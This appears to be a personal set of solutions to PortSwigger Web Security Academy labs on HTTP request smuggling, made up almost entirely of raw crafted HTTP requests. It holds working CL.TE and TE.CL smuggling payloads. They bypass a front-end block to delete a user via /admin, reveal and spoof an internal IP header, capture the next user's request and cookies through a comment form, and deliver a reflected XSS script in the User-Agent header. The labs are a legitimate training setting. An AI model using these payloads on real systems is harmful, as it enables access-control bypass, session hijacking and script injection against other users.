```
Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

PRACTITIONER

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response. 
```
```
POST / HTTP/1.1
Host: 0a96005804f586f68003122200b30075.web-security-academy.net
Cookie: session=ZAaltFdjYZ2GMhVJsf9sgzhxM2figYrM
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 30
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```


---

```
Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

PRACTITIONER

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response. 
```
```
POST / HTTP/1.1
Host: 0aa6009f03c09a1681387fcb00c300b4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


---

```
Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

PRACTITIONER
LAB Not solved

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos. 
```
```
POST / HTTP/1.1
Host: 0a3b002d03426e5c81e49ee0008d0049.web-security-academy.net
Cookie: session=cqrb3y6BwzHWWOjFxmJbZUUEcHmyabZo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 74
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 50

test=


```

---

```
Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

PRACTITIONER

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.  
```
```
POST / HTTP/1.1
Host: 0a0e002d040540f18419551b00a9004c.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

```
Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

PRACTITIONER

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.   
```

Find the name of the special header 

```
POST / HTTP/1.1
Host: 0a58002d04288d4e82a11af200f500a4.web-security-academy.net
Cookie: session=aBTgLlefuXz4xYIdM70LcK15TLAMypTC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: https://0a58002d04288d4e82a11af200f500a4.web-security-academy.net
Referer: https://0a58002d04288d4e82a11af200f500a4.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test

```
> Found : X-QdmVcC-Ip

So now you can delete Carlos :

```
POST / HTTP/1.1
Host: 0a58002d04288d4e82a11af200f500a4.web-security-academy.net
Cookie: session=aBTgLlefuXz4xYIdM70LcK15TLAMypTC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: https://0a58002d04288d4e82a11af200f500a4.web-security-academy.net
Referer: https://0a58002d04288d4e82a11af200f500a4.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-QdmVcC-Ip: 127.0.0.1
Content-Length: 200
Connection: close

search=test

```
---
```
Lab: Exploiting HTTP request smuggling to capture other users' requests

PRACTITIONER

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account. 
```

```
POST / HTTP/1.1
Host: 0afa00500453a87581cd527100fc0079.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Cookie: session=xSx5ZuP6RGnXJWcpJZAyh6Zge1NGSegv
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0afa00500453a87581cd527100fc0079.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 969
Transfer-Encoding: chunked

0

POST /post/comment HTTP/2
Host: 0afa00500453a87581cd527100fc0079.web-security-academy.net
Cookie: session=7DS0xzECn4Xjd47opgkOnFMNqw52FrIp; session=UV9g5tx0JLrYZOjP4oMX2zSrBf9O2Lcf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 950
Origin: https://0afa00500453a87581cd527100fc0079.web-security-academy.net
Referer: https://0afa00500453a87581cd527100fc0079.web-security-academy.net/post?postId=7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=Q42hGEokSvVTWdZxZKKoQAQZv7NQjqef&postId=7&website=http%3A%2F%2Ftest&name=test&email=test%40test.fr&comment=test%20:%20
```

---

```
Lab: Exploiting HTTP request smuggling to deliver reflected XSS

PRACTITIONER

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1). 
```

```
POST / HTTP/1.1
Host: 0a7400110476605081a320c100d00079.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 666

0

GET /post?postId=6 HTTP/1.1
Host: 0a7400110476605081a320c100d00079.web-security-academy.net
Cookie: session=Syhsj36eBOVawWxy6jMMYGpT5aNSPgxR
User-Agent: "><script>alert(1)</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a7400110476605081a320c100d00079.web-security-academy.net/
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 5

t=t
```

---